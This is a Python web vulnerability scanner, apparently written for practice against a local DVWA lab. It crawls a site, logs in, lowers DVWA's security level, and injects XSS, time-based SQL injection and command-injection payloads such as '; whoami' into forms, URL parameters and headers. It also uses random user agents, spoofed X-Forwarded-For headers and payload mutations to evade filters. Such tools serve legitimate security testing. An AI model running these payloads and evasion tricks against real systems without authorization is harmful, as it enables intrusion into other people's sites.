import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import time
import csv
import random
import concurrent.futures
from jinja2 import Template
import urllib3
import re
import json
from threading import Semaphore

urllib3.disable_warnings()

# =====================================================================
# 🌐 全局变量（供 Flask 调用时动态替换）
# =====================================================================
TARGETS = []
LOGIN_URL = ""
USERNAME = ""
PASSWORD = ""
BLACKLIST = ["logout.php", "signout.php", "exit.php", "setup.php", "phpinfo.php"]
IGNORE_SUFFIX = ['.md', '.txt', '.pdf', '.jpg', '.png', '.css', '.js', '.zip', '.tar', '.gz', '.mp4']
SCANNED_PARAMS = set()
FAILED_URLS = {}

# 并发信号量：限制最大并发数为 3，防止打崩本地靶场
MAX_CONCURRENT = 3
sem = Semaphore(MAX_CONCURRENT)

# =====================================================================
# 🚀 满配全量武器库
# =====================================================================
PAYLOADS = {
    "XSS": [
        "<script>alert('VULN_XSS_777')</script>",
        "<img src=x onerror=alert('VULN_XSS_777')>",
        "\"><svg/onload=alert('VULN_XSS_777')>",
        "<body onload=alert('VULN_XSS_777')>",
        "javascript:alert('VULN_XSS_777')"
    ],
    "SQLI": [
        "1' AND SLEEP(3)-- ",
        "1 AND SLEEP(3)",
        "1' OR '1'='1"
    ],
    "CMD": [
        "; echo VULN_CMD_777",
        "| echo VULN_CMD_777",
        "&& echo VULN_CMD_777",
        "; whoami",
        "| whoami"
    ]
}

# =====================================================================
# 引擎核心代码
# =====================================================================

def get_stealth_headers():
    return {
        "User-Agent": UserAgent().random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "X-Forwarded-For": f"192.168.1.{random.randint(1, 254)}",
        "Connection": "keep-alive"
    }

def safe_request(session, method, url, timeout=8, **kwargs):
    with sem:
        kwargs['headers'] = kwargs.get('headers', get_stealth_headers())
        kwargs['timeout'] = timeout
        kwargs['verify'] = False
        start_t = time.time()
        try:
            if method.upper() == "GET":
                res = session.get(url, **kwargs)
            elif method.upper() == "POST":
                res = session.post(url, **kwargs)
            elif method.upper() == "JSON":
                kwargs['headers']['Content-Type'] = "application/json"
                res = session.post(url, data=json.dumps(kwargs.get('data', {})), **kwargs)
            return res, time.time() - start_t
        except Exception:
            return None, time.time() - start_t

def mutate_payload(payload):
    mutations = [
        lambda p: p, 
        lambda p: p.replace("<script>", "<ScRiPt>").replace("</script>", "</sCrIpT>"),
        lambda p: p.replace("<", "%3C").replace(">", "%3E")
    ]
    return random.choice(mutations)(payload)

# ================= 漏洞探测插件 =================
def test_xss(session, url, data, param):
    findings = []
    for payload in PAYLOADS["XSS"]:
        mutated = mutate_payload(payload)
        test_data = {k: v for k, v in data.items() if k.lower() != 'submit'}
        test_data[param] = mutated
        
        # 1. GET
        res_get, _ = safe_request(session, "GET", url, params=test_data)
        if res_get and mutated in res_get.text:
            findings.append({"类型": "GET XSS", "URL": url, "参数": param, "Payload": mutated, "证据": "专属特征回显"})
            return findings

        # 2. POST
        res_post, _ = safe_request(session, "POST", url, data=test_data)
        if res_post and mutated in res_post.text:
            findings.append({"类型": "POST XSS", "URL": url, "参数": param, "Payload": mutated, "证据": "专属特征回显"})
            return findings

        # 3. Header
        headers = get_stealth_headers()
        headers["X-Forwarded-For"] = mutated
        res_head, _ = safe_request(session, "GET", url, headers=headers)
        if res_head and mutated in res_head.text:
            findings.append({"类型": "Header XSS", "URL": url, "参数": "X-Forwarded-For", "Payload": mutated, "证据": "专属特征回显"})
            return findings
    return findings

def test_sqli(session, url, data, param):
    findings = []
    clean_data = {k: v for k, v in data.items() if k.lower() != 'submit'}
    
    _, base_elapsed = safe_request(session, "GET", url, params=clean_data)
    threshold = max(2.5, base_elapsed + 2.0)
    
    for payload in PAYLOADS["SQLI"]:
        test_data = clean_data.copy()
        test_data[param] = payload
        
        # 1. GET
        _, elapsed_get = safe_request(session, "GET", url, params=test_data, timeout=10)
        if elapsed_get > threshold:
            findings.append({"类型": "GET SQL 盲注", "URL": url, "参数": param, "Payload": payload, "证据": f"延迟 {elapsed_get:.2f}s"})
            return findings
            
        # 2. POST
        _, elapsed_post = safe_request(session, "POST", url, data=test_data, timeout=10)
        if elapsed_post > threshold:
            findings.append({"类型": "POST SQL 盲注", "URL": url, "参数": param, "Payload": payload, "证据": f"延迟 {elapsed_post:.2f}s"})
            return findings
    return findings

def test_cmd(session, url, data, param):
    findings = []
    for payload in PAYLOADS["CMD"]:
        test_data = {k: v for k, v in data.items() if k.lower() != 'submit'}
        test_data[param] = payload
        
        # 1. GET 测
        res_get, _ = safe_request(session, "GET", url, params=test_data)
        if res_get and "VULN_CMD_777" in res_get.text:
            soup = BeautifulSoup(res_get.text, 'html.parser')
            is_executed = False
            for node in soup.find_all(string=re.compile(r'VULN_CMD_777')):
                parent = str(node.parent)
                if 'input' in parent or 'textarea' in parent or 'value=' in parent: continue
                if "Warning" in res_get.text or "Error" in res_get.text: continue
                is_executed = True
                break
            if is_executed:
                findings.append({"类型": "GET CMD注入", "URL": url, "参数": param, "Payload": payload, "证据": "上下文执行回显"})
                return findings
                
        # 2. POST 测
        res_post, _ = safe_request(session, "POST", url, data=test_data)
        if res_post and "VULN_CMD_777" in res_post.text:
            soup_post = BeautifulSoup(res_post.text, 'html.parser')
            is_executed = False
            for node in soup_post.find_all(string=re.compile(r'VULN_CMD_777')):
                parent = str(node.parent)
                if 'input' in parent or 'textarea' in parent or 'value=' in parent: continue
                if "Warning" in res_post.text or "Error" in res_post.text: continue
                is_executed = True
                break
            if is_executed:
                findings.append({"类型": "POST CMD注入", "URL": url, "参数": param, "Payload": payload, "证据": "上下文执行回显"})
                return findings
    return findings

def test_json(session, url):
    findings = []
    test_payload = {"id": "<script>alert('VULN_XSS_777')</script>", "query": "' OR '1'='1"}
    try:
        res, _ = safe_request(session, "JSON", url, data=test_payload)
        if res and "VULN_XSS_777" in res.text:
            findings.append({"类型": "JSON 注入", "URL": url, "参数": "JSON Body", "Payload": str(test_payload), "证据": "源码回显"})
    except: pass
    return findings

# ================= 爬虫与调度 =================
def analyze_target(session, target_url):
    findings = []
    if any(target_url.lower().endswith(suffix) for suffix in IGNORE_SUFFIX): return findings
        
    res, _ = safe_request(session, "GET", target_url)
    if not res: 
        FAILED_URLS[target_url] = FAILED_URLS.get(target_url, 0) + 1
        return findings
    
    soup = BeautifulSoup(res.text, 'html.parser')
    
    # 表单
    for form in soup.find_all('form'):
        action = urljoin(target_url, form.get('action', ''))
        inputs = form.find_all(['input', 'textarea'])
        form_data = {}
        targets = []
        for inp in inputs:
            name = inp.get('name')
            if not name: continue
            if inp.get('type') in ['text', 'search', 'textarea', None]:
                targets.append(name)
            form_data[name] = inp.get('value', '')
                
        for t in targets:
            unique_key = f"{action}_{t}"
            if unique_key in SCANNED_PARAMS: continue
            SCANNED_PARAMS.add(unique_key)
            print(f"  [+] 发现表单注入点: [{t}]")
            findings.extend(test_xss(session, action, form_data, t))
            findings.extend(test_sqli(session, action, form_data, t))
            findings.extend(test_cmd(session, action, form_data, t))
            
    # URL 参数
    parsed = urlparse(target_url)
    for param in parse_qs(parsed.query):
        unique_key = f"{target_url}_{param}"
        if unique_key in SCANNED_PARAMS: continue
        SCANNED_PARAMS.add(unique_key)
        flat_data = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        print(f"  [+] 发现 URL 注入点: [{param}]")
        findings.extend(test_xss(session, target_url, flat_data, param))
        findings.extend(test_sqli(session, target_url, flat_data, param))
        findings.extend(test_cmd(session, target_url, flat_data, param))
        
    # JSON 探测
    if any(k in target_url.lower() for k in ['api', 'json', 'graphql']):
        findings.extend(test_json(session, target_url))
        
    return findings

def login_and_scan():
    global TARGETS, LOGIN_URL, USERNAME, PASSWORD
    session = requests.Session()
    
    # 尝试登录
    res, _ = safe_request(session, "GET", LOGIN_URL)
    if res and "Damn Vulnerable" in res.text:
        print("[*] 检测到 DVWA 特征，正在尝试自动登录...")
        token_input = BeautifulSoup(res.text, 'html.parser').find('input', {'name': 'user_token'})
        if token_input:
            token = token_input['value']
            safe_request(session, "POST", LOGIN_URL, data={"username": USERNAME, "password": PASSWORD, "Login": "Login", "user_token": token})
            
            # 降级
            sec_res, _ = safe_request(session, "GET", urljoin(TARGETS[0], "security.php"))
            if sec_res:
                sec_token_input = BeautifulSoup(sec_res.text, 'html.parser').find('input', {'name': 'user_token'})
                if sec_token_input:
                    sec_token = sec_token_input['value']
                    safe_request(session, "POST", urljoin(TARGETS[0], "security.php"), data={"security": "low", "seclev_submit": "Submit", "user_token": sec_token})
            print("[+] 登录并降级成功。\n")
    else:
        print("[*] 未检测到已知登录特征，将以游客身份继续扫描...\n")

    print("[*] 启动全场景爬虫与并发调度...")
    queue = [TARGETS[0]]
    scanned = set()
    urls_to_scan = []
    
    while queue:
        current = queue.pop(0)
        if current in scanned or any(b in current for b in BLACKLIST): continue
        if FAILED_URLS.get(current, 0) >= 3: continue
        scanned.add(current)
        urls_to_scan.append(current)
        
        if not any(current.lower().endswith(s) for s in IGNORE_SUFFIX):
            res, _ = safe_request(session, "GET", current)
            if res:
                soup = BeautifulSoup(res.text, 'html.parser')
                for a in soup.find_all('a', href=True):
                    next_url = urljoin(current, a['href'])
                    if urlparse(TARGETS[0]).netloc == urlparse(next_url).netloc and next_url not in scanned and next_url not in queue:
                        queue.append(next_url)
                        
    print(f"[*] 爬虫收集完毕，共发现 {len(urls_to_scan)} 个待测试页面。开始满载并发探测...")
    
    all_findings = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        future_tasks = []
        for target_url in urls_to_scan:
            cloned_session = requests.Session()
            cloned_session.cookies.update(session.cookies)
            future_tasks.append(executor.submit(analyze_target, cloned_session, target_url))
            
        for future in concurrent.futures.as_completed(future_tasks):
            try:
                results = future.result()
                if results:
                    all_findings.extend(results)
                    for res in results:
                        print(f"    🎉 [发现] {res['类型']} | 参数: {res['参数']}")
            except:
                pass
                
    return all_findings

# ================= 报告导出 =================
def generate_report(findings):
    unique_findings = []
    seen = set()
    for f in findings:
        key = f"{f['类型']}_{f['URL']}_{f['参数']}_{f['Payload']}"
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)
            
    with open("ultimate_report.csv", mode='w', newline='', encoding='utf-8-sig') as f:
        writer = csv.DictWriter(f, fieldnames=["类型", "URL", "参数", "Payload", "证据"])
        writer.writeheader()
        writer.writerows(unique_findings)
        
    html_template = """
    <!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>终极安全扫描报告</title>
    <style>body{font-family:Arial;background:#f4f7f6;padding:20px;} .container{max-width:1200px;margin:0 auto;background:#fff;padding:30px;border-radius:8px;} h1{color:#2c3e50;text-align:center;border-bottom:3px solid #e74c3c;} .high{color:#e74c3c;font-weight:bold;} table{width:100%;border-collapse:collapse;margin-top:20px;} th,td{border:1px solid #ddd;padding:12px;} th{background:#34495e;color:white;}</style></head>
    <body><div class="container"><h1>🛡️ 全场景安全扫描报告</h1><p>发现漏洞总数: <span class="high">""" + str(len(unique_findings)) + """</span></p>
    <table><tr><th>类型</th><th>URL</th><th>参数</th><th>Payload</th><th>证据</th></tr>
    {% for f in findings %}<tr><td class="high">{{ f.类型 }}</td><td>{{ f.URL }}</td><td>{{ f.参数 }}</td><td>{{ f.Payload }}</td><td>{{ f.证据 }}</td></tr>{% endfor %}
    </table></div></body></html>
    """
    with open("ultimate_report.html", mode="w", encoding="utf-8") as f:
        f.write(Template(html_template).render(findings=unique_findings))
    print("[+] 报告导出成功！")

# =====================================================================
# 🚀【Flask Web 接口调用核心】
# =====================================================================
def run_scan_for_web(target_url, username, password):
    """供 Flask 调用的入口函数"""
    global TARGETS, LOGIN_URL, USERNAME, PASSWORD, SCANNED_PARAMS, FAILED_URLS
    
    # 每次扫描前清空状态
    SCANNED_PARAMS.clear()
    FAILED_URLS.clear()
    
    TARGETS = [target_url]
    LOGIN_URL = urljoin(target_url, "login.php")
    USERNAME = username
    PASSWORD = password

    print(f"\n=== 收到 Web 端请求，开始扫描: {target_url} ===\n")
    results = login_and_scan() 
    
    if results:
        generate_report(results)
    return results

# 如果你直接在终端运行 scanner.py，它依然能独立跑
if __name__ == "__main__":
    print("=== 多态自适应引擎 ===\n")
    run_scan_for_web("http://127.0.0.1/dvwa/", "admin", "password")